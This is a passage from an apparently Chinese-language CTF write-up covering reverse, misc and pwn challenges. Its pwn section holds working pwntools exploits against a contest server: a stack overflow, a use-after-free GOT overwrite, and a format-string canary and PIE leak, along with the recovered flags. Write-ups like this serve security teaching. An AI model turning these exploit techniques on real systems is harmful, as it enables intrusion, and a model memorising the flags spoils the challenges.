+  <span class="n">v12</span> <span class="o">=</span> <span class="mi">1732584193</span><span class="p">;</span>
+  <span class="n">v13</span> <span class="o">=</span> <span class="o">-</span><span class="mi">271733879</span><span class="p">;</span>
+  <span class="n">v14</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1732584194</span><span class="p">;</span>
+  <span class="n">v15</span> <span class="o">=</span> <span class="mi">271733878</span><span class="p">;</span>
+  <span class="n">MD5Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v8</span><span class="p">));</span>
+  <span class="n">MD5Final</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">firstMd5</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;_&#39;</span> <span class="p">)</span> <span class="c1">//concat with &#39;_&#39;</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Please input something...&quot;</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">gets</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+  <span class="n">strncpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v8</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="mi">3u</span><span class="p">);</span>
+  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v12</span> <span class="o">=</span> <span class="mi">1732584193</span><span class="p">;</span>
+  <span class="n">v13</span> <span class="o">=</span> <span class="mi">4023233417</span><span class="p">;</span>
+  <span class="n">v14</span> <span class="o">=</span> <span class="mi">2562383102</span><span class="p">;</span>
+  <span class="n">v15</span> <span class="o">=</span> <span class="mi">271733878</span><span class="p">;</span>
+  <span class="n">MD5Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v8</span><span class="p">));</span>
+  <span class="n">MD5Final</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">secondMd5</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">)</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;_&#39;</span> <span class="p">)</span>
+    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
+  <span class="n">strcat</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Please input something...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mh">0x1Au</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__iob</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">__iob</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">_ptr</span><span class="p">);</span>
+  <span class="n">v10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">v12</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">gE</span><span class="err">#\</span><span class="n">x01</span><span class="err">&#39;</span><span class="p">;</span>
+  <span class="n">v13</span> <span class="o">=</span> <span class="mi">4023233417</span><span class="p">;</span>
+  <span class="n">v14</span> <span class="o">=</span> <span class="mi">2562383102</span><span class="p">;</span>
+  <span class="n">v15</span> <span class="o">=</span> <span class="mi">271733878</span><span class="p">;</span>
+  <span class="n">MD5Update</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="n">v5</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">v5</span><span class="p">));</span>
+  <span class="n">MD5Final</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">thirdMd5</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">strcat</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
+    <span class="n">rc4_init</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">v4</span><span class="p">));</span>
+    <span class="n">rc4_crypto</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v16</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flag</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">));</span>
+    <span class="n">fputs</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__iob</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">v8</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+<span class="nl">LABEL_12</span><span class="p">:</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Oops!...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="mi">9u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">__iob</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="n">v6</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div></p>
+<h2 id="misc">misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
+<h3 id="picture">Picture<a class="headerlink" href="#picture" title="Permanent link">&para;</a></h3>
+<ol>
+<li>先用binwalk解开后得到一个压缩包，解压后看到<code>lsb-stego.png</code>和<code>password.txt</code></li>
+<li>用password.txt里的密码解lsb隐写，得到一个压缩包，解压得到flag:<code>flag{l3h_no_game_no_life}#</code>
+<img alt="lsb" src="../2019-02-13-01-28-31.png" /></li>
+<li>相关工具https://github.com/livz/cloacked-pixel</li>
+</ol>
+<h3 id="traffic1">traffic1<a class="headerlink" href="#traffic1" title="Permanent link">&para;</a></h3>
+<h4 id="tips">解压tips<a class="headerlink" href="#tips" title="Permanent link">&para;</a></h4>
+<blockquote>
+<p>tip1:对Rar文件头的十六进制数要敏感<br />
+tip2:密码在流量包中（HTTP）<br />
+- .... . ..--.- .--. .- ... ... .-- --- .-. -.. ..--.- .. ... ..--.- . -. -.-. .-. -.-- .--. - . -.. ..--.- -... -.-- ..--.- .--- ... ..-. ..- -.-. -.-</p>
+</blockquote>
+<p>解开第三段莫尔斯电码得到：<code>the_password_is_encrypted_by_jsfuck</code></p>
+<h5 id="_1">分析流量包<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h5>
+<p>导出http对象
+<img alt="wireshark" src="../2019-02-12-22-52-29.png" />
+可以看到有异常的流量，打开导出的流量，得到jsfuck代码
+<img alt="ubuntu" src="../2019-02-12-22-54-03.png" />
+<img alt="jsfuck" src="../2019-02-12-22-54-52.png" />
+扔到chrome的f12里，拿到一个密码<code>Thi5_my_p@ssW0rd</code>
+<img alt="password" src="../2019-02-12-22-57-56.png" />
+用010editor打开secret.log, ctrl+f 搜索字符串<code>5261</code>(rar文件头)
+<img alt="010editor" src="../2019-02-12-23-01-06.png" />
+或者用wireshark搜，因为secret是蓝牙的log文件
+<img alt="wireshark" src="../2019-02-12-23-02-32.png" />
+导入后得到一个压缩包，用jsfuck得到的密码解压后，拿到flag:<code>flag{l3h_tr4_ffic_4n4_lys3}</code></p>
+<h2 id="pwn">pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
+<h3 id="stack">stack<a class="headerlink" href="#stack" title="Permanent link">&para;</a></h3>
+<p>简单的栈溢出
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">DEBUG</span><span class="o">=</span><span class="mi">0</span>
+<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./stack&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span> <span class="mi">10003</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x3A</span><span class="o">+</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x80491E2</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
+<h3 id="vitamin">vitamin<a class="headerlink" href="#vitamin" title="Permanent link">&para;</a></h3>
+<p>三个功能，创建修改删除
+<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">sub_4009D6</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp-14h] [rbp-14h]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp-10h] [rbp-10h]</span>
+
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">sub_400B71</span><span class="p">();</span>
+    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_400E14</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
+    <span class="n">getchar</span><span class="p">();</span>
+    <span class="k">switch</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+        <span class="n">sub_400C74</span><span class="p">();</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Done.&quot;</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+        <span class="n">sub_400CEB</span><span class="p">();</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Done.&quot;</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+        <span class="n">create</span><span class="p">();</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Done.&quot;</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+      <span class="k">default</span><span class="o">:</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;No such choice.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+删除功能的free并没有清空指针，造成uaf漏洞。
+<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_400C74</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="o">||</span> <span class="n">dword_6020A4</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;No pill.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> <span class="c1">//buf not nullptr</span>
+    <span class="n">dword_6020A4</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Done.&quot;</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+观察malloc大小，需要在内存中寻找0x71~0x7f的size，
+<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp-38h] [rbp-38h]</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp-10h] [rbp-10h]</span>
+
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x68uLL</span><span class="p">);</span>
+  <span class="n">qword_6020F0</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10uLL</span><span class="p">);</span>
+  <span class="n">dword_6020A4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Give me your formula:&quot;</span><span class="p">);</span>
+  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">);</span>
+  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v1</span><span class="p">,</span> <span class="mh">0x28uLL</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;This is your pill&quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+整个exp分三步，先利用uaf 伪造在<code>bss段</code>的chunk,再修改buf的地址到got表，最后将<code>got['free']</code>改为后门地址。
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
+<span class="c1">#p=process(&#39;./vitamin&#39;)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span> <span class="o">=</span> <span class="s1">&#39;0x400BC7&#39;</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;b *&quot;</span> <span class="o">+</span> <span class="n">addr</span><span class="p">)</span>
+    <span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;debug:&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">formula</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">formula</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">formula</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">formula</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">take</span><span class="p">():</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="c1">#debug()</span>
+
+<span class="n">free_got</span><span class="o">=</span><span class="mh">0x602018</span>
+<span class="n">create</span><span class="p">(</span><span class="s1">&#39;windforce&#39;</span><span class="p">)</span>
+<span class="n">take</span><span class="p">()</span>
+<span class="n">change</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020dd</span><span class="p">))</span>
+<span class="n">create</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020dd</span><span class="p">))</span>
+<span class="n">create</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">11</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">))</span>
+<span class="n">change</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400d58</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+flag{b49b2c44-35a1-4be5-9dfa-c173f20e60ee}</p>
+<h3 id="randgame">RandGame<a class="headerlink" href="#randgame" title="Permanent link">&para;</a></h3>
+<p>只有三次输出机会，每次输入的字符串都会被hash(),然后结果和一个随机数比较。
+<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-Ch]</span>
+
+  <span class="n">setbufs</span><span class="p">();</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;This is a simple game. You have 3 chances.&quot;</span><span class="p">);</span>
+  <span class="n">v5</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+  <span class="n">signal</span><span class="p">(</span><span class="mi">14</span><span class="p">,</span> <span class="n">exit_func</span><span class="p">);</span>
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v3</span> <span class="o">=</span> <span class="n">v5</span><span class="o">--</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="n">Game</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="err">显然输入的字符串是可以覆盖到到随机数`</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="o">~</span><span class="n">v7</span><span class="err">`</span><span class="p">,</span><span class="err">只需要预先跑出</span><span class="n">hash值</span><span class="err">，再覆盖随机数，就能过</span><span class="n">check</span><span class="err">，通过</span><span class="n">check后会输出字符串</span><span class="err">，存在字符串格式化漏洞。</span>  
+<span class="err">由于程序开启了</span><span class="n">PIE</span> <span class="n">stack等保护</span><span class="err">，不能直接</span><span class="n">ret2text</span><span class="err">。要先泄露</span><span class="n">canary的值</span><span class="err">，然后泄露程序加载地址，最后再修改</span><span class="n">ret地址到后门</span><span class="err">。</span>
+</pre></div>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+<div class="codehilite"><pre><span></span>```c
+unsigned int Game()
+{
+  unsigned int v0; // eax
+  unsigned int v1; // eax
+  char s; // [esp+Ch] [ebp-10Ch]
+  char v4; // [esp+106h] [ebp-12h]
+  char v5; // [esp+107h] [ebp-11h]
+  char v6; // [esp+108h] [ebp-10h]
+  char v7; // [esp+109h] [ebp-Fh]
+  char v8; // [esp+10Ah] [ebp-Eh]
+  unsigned int v9; // [esp+10Ch] [ebp-Ch]
+
+  v9 = __readgsdword(0x14u);
+  memset(&amp;s, 0, 0x100u);
+  v0 = time(0);
+  srand(v0);
+  v4 = rand();
+  v5 = rand();
+  v6 = rand();
+  v7 = rand();
+  v8 = 0;
+  puts(&quot;What&#39;s your magic string?&quot;);
+  gets(&amp;s);
+  v1 = Hash(&amp;s);
+  if ( v1 == *&amp;v4 )
+  {
+    puts(&quot;Congraz!! Your magic string is:&quot;);
+    printf(&amp;s);
+  }
+  else
+  {
+    puts(&quot;Wrong!&quot;);
+  }
+  return __readgsdword(0x14u) ^ v9;
+}
+</pre></div>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
+<span class="c1">#context.log_level=&#39;debug&#39;</span>
+<span class="c1">#p=process(&#39;./game&#39;)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;159.65.68.241&#39;</span><span class="p">,</span><span class="mi">10002</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;?&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%71$p&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">250</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x365</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">canary</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;W&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;canary is &#39;</span><span class="o">+</span> <span class="n">canary</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%3$p&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">250</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x19</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">base</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;W&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;base is &#39;</span><span class="o">+</span> <span class="n">base</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">base</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;2f5&#39;</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+flag{15c36180-35bf-47af-87d9-6bcde64ff6b2}</p>
+<h2 id="pubg-cheating-tools">pubg cheating tools<a class="headerlink" href="#pubg-cheating-tools" title="Permanent link">&para;</a></h2>
+<p>程序有两个选项，一个是买，一个是激活，买没什么用处，只有一句<code>puts("send 2 BTC wallet 114514, and you'll get the download url");</code>
+<img alt="pubg" src="../2019-02-24-04-50-03.png" />
